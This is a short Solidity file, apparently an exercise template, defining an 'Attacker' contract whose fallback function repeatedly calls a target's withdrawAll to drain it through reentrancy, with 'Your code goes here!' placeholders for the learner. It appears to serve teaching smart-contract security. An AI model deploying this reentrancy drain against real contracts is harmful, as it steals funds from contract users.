// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.13;


interface IVulnerable {
    function withdraw() external;
    function deposit() external payable;
    function withdrawAll() external;
    function withdrawSome(uint256 amount) external;
}


contract Attacker {

	IVulnerable public target;
	
	constructor(address _target) {
		target = IVulnerable(_target);
	}

    receive() external payable {
        if(address(target).balance != 0 ) {
            target.withdrawAll();
        }
        /*
            Your code goes here!
        */
    }

    function exploit() public payable {
        target.deposit{value: 1 ether}();
        target.withdrawAll();
        /*
            Your code goes here!
        */
    }
}